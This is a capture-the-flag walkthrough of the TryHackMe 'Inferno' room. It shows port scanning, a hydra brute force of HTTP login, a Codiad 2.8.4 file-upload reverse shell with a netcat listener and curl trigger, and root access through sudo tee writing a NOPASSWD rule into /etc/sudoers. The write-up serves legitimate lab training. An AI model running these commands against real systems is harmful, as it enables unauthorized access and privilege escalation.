# Try Hack Me - Inferno
# Author: Atharva Bordavekar
# Difficulty: Medium
# Points: 60
# Vulnerabilities: Codiad 2.8.4 RCE via file upload, PrivEsc via GTFObins

# Phase 1 - Reconnaissance: 

nmap scan:
```bash
nmap -p- --min-rate=1000 <target_ip>
```

```markdown
<details>
<summary>Click to expand full Nmap scan results</summary>

```bash
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
80/tcp    open  http
88/tcp    open  kerberos-sec
106/tcp   open  pop3pw
110/tcp   open  pop3
194/tcp   open  irc
389/tcp   open  ldap
443/tcp   open  https
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
750/tcp   open  kerberos
775/tcp   open  entomb
777/tcp   open  multiling-http
779/tcp   open  unknown
783/tcp   open  spamassassin
808/tcp   open  ccproxy-http
873/tcp   open  rsync
1001/tcp  open  webpush
1178/tcp  open  skkserv
1210/tcp  open  eoss
1236/tcp  open  bvcontrol
1300/tcp  open  h323hostcallsc
1313/tcp  open  bmc_patroldb
1314/tcp  open  pdps
1529/tcp  open  support
2000/tcp  open  cisco-sccp
2003/tcp  open  finger
2121/tcp  open  ccproxy-ftp
2150/tcp  open  dynamic3d
2600/tcp  open  zebrasrv
2601/tcp  open  zebra
2602/tcp  open  ripd
2603/tcp  open  ripngd
2604/tcp  open  ospfd
2605/tcp  open  bgpd
2606/tcp  open  netmon
2607/tcp  open  connection
2608/tcp  open  wag-service
2988/tcp  open  hippad
2989/tcp  open  zarkov
4224/tcp  open  xtell
4557/tcp  open  fax
4559/tcp  open  hylafax
4600/tcp  open  piranha1
4949/tcp  open  munin
5051/tcp  open  ida-agent
5052/tcp  open  ita-manager
5151/tcp  open  esri_sde
5354/tcp  open  mdnsresponder
5355/tcp  open  llmnr
5432/tcp  open  postgresql
5555/tcp  open  freeciv
5666/tcp  open  nrpe
5667/tcp  open  unknown
5674/tcp  open  hyperscsi-port
5675/tcp  open  v5ua
5680/tcp  open  canna
6346/tcp  open  gnutella
6514/tcp  open  syslog-tls
6566/tcp  open  sane-port
6667/tcp  open  irc
8021/tcp  open  ftp-proxy
8081/tcp  open  blackice-icecap
8088/tcp  open  radan-http
8990/tcp  open  http-wmap
9098/tcp  open  unknown
9359/tcp  open  unknown
9418/tcp  open  git
9673/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt
10081/tcp open  famdc
10082/tcp open  amandaidx
10083/tcp open  amidxtape
11201/tcp open  smsqp
15345/tcp open  xpilot
17001/tcp open  unknown
17002/tcp open  unknown
17003/tcp open  unknown
17004/tcp open  unknown
20011/tcp open  unknown
20012/tcp open  ss-idi-disc
24554/tcp open  binkp
27374/tcp open  subseven
30865/tcp open  unknown
57000/tcp open  unknown
60177/tcp open  unknown
60179/tcp open  unknown
</details>
```

this reminds me of a honeypot CTF which i solved earlier. there is a lot of unnecessary noise which may cause confusion but lets stick to the plan and try to enumerate the webpage at the port 80 first to get some basic knowledge about the webserver.

we will run a gobuster scan on the webpage.

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/medium.txt
```
i found only one interesting directory from the scan:

`/inferno              (Status: 401) [Size: 460]`

after accessing the /inferno directory, we get a browser interrupt which will ask for username and password. since i did not have any idea on the usernames, i tried various things like performing steghide on the image present at the website, tried bruteforcing usernames like satan, lucifer considering the verses on the main page were talking about satan. but all of these methods failed. i enumerated with the Usernames.txt wordlists from seclists but it took too much time. after all the futile enumeration, i decided to use the username "admin"

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target_ip> http-get /inferno/ -t 64 
```
after some time we get the results:

[80][http-get] host: 10.80.175.179   login: admin   password: < REDACTED >

now we login using these credentials. after logging in, we find another login page. we will use the same credentials for this login page aswell. 

![image1](https://github.com/realatharva15/inferno_writeup/blob/main/images/Screenshot%202026-01-20%20at%2023-32-01%20Codiad.png)

now we finally have an interface. we find a codiad interface which is an IDE. i personally had exploited a codiad machine in the CTF named IDE. so we will try to find some exploits of the codiad ide.

```bash
searchsploit codiad
```
we find a couple of exploits.
```bash
------------------------------------- ---------------------------------
 Exploit Title                       |  Path
------------------------------------- ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilit | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion  | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution | multiple/webapps/50474.txt
------------------------------------- ---------------------------------

Shellcodes: No Results
```
# Phase 2 - Initial Foothold:

i tried the python scripts but none of them worked since the website had two login panels. even after editing the scripts, we could not manage to get a shell. so i will be carrying out the exploit manually. lets get the 50474.txt and read the contents

```bash
searchsploit -m multiple/webapps/50474.txt
```
the contents of this file is:
```bash
# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)
# Author: P4p4_M4n3
# Vendor Homepage: http://codiad.com/
# Software Links : https://github.com/Codiad/Codiad/releases
# Type:  WebApp

###################-------------------------##########################------------###################
#    Proof of Concept:                                                                              #
#                                                                                                   #
#   1- login on codiad                                                                              #
#                                                                                                   #
#   2- go to themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/" directory #
#                                                                                                   #
#   3-  right click and select upload file                                                          #
#                                                                                                   #
#   4- click on "Drag file or Click Here To Upload" and select your reverse_shell file              #
#                                                                                                   #
###################-------------------------#########################-------------###################

   after that your file should be in INF directory, right click on your file and select delete,

   and you will see the full path of your file

   run it in your terminal with "curl" and boom!!

/var/www/html/codiad/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell.php

1 -  # nc -lnvp 1234
2 - curl http://target_ip/codiad/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell.php -u "admin:P@ssw0rd" 

```
inshort we have to navigate to the themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/ directory and upload a reverse shell there and then trigger the reverseshell by visiting the location where the shell was uploaded to. lets do this systematically

first navigate to the themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/ directory.

![image2](https://github.com/realatharva15/inferno_writeup/blob/main/images/Screenshot%202026-01-20%20at%2023-32-41%20Codiad.png)

# Shell as www-data:

now upload the reverseshell (NOTE: make sure your ip and port info is correct)

![image3](https://github.com/realatharva15/inferno_writeup/blob/main/images/shellupload.png)

```bash
#setup a netcat listner:
nc -lnvp 4444
```
now lets visit the path where this shell was uploaded to.

![image4](https://github.com/realatharva15/inferno_writeup/blob/main/images/revshell.png)

we have a shell as www-data! now lets enumerate the machine further. after doing some manual enumeration, we found 3 .txt files at /home/dante/Desktop. we immediately transfer them to our attacker machine. after analysing the 3 files which were inferno.txt, paradiso.txt and purgatory.txt we find no leads. seems like they were just some distractions by the creator of this room. 

# Shell as dante:

in the /home/dante/Downloads directory we find a hidden file named .download.dat. it contains some hex strings. 

```bash
cat .download.dat
```

we will use cyber chef to decode the hex strings

the decoded output gives us the credentials of the user dante. we will quickly ssh into the machine

```bash
ssh dante@<target_ip>
```
we read and submit the local.txt flag present at /home/dante/local.txt
now immediately we will find out the privileges of the user dante using sudo -l

# Phase 3 - ROOT access: 

```bash
sudo -l
```

User dante may run the following commands on ip-10-80-175-179:
    (root) NOPASSWD: /usr/bin/tee

this is a classic GTFObins styled privilege escalation scenario. we can add user dante into the sudoers file and then execute sudo bash in order to get a root shell. but wait, there is a security feature which will kick us out of the shell after every minute. so we have to be quick.

![image5](https://github.com/realatharva15/inferno_writeup/blob/main/images/Screenshot_2026-01-20_23-51-11.png)

```bash
#add dante to the sudoers file using tee command:
echo "dante ALL=(ALL) NOPASSWD:ALL" | sudo /usr/bin/tee -a /etc/sudoers
```
now we will quickly run sudo bash to get a root shell.

```bash
sudo bash
```
and just like that we have rooted the UNDERWORLD!!! we read and submit the proof.txt flag present at /root/proof.txt
                                                                                                                                    
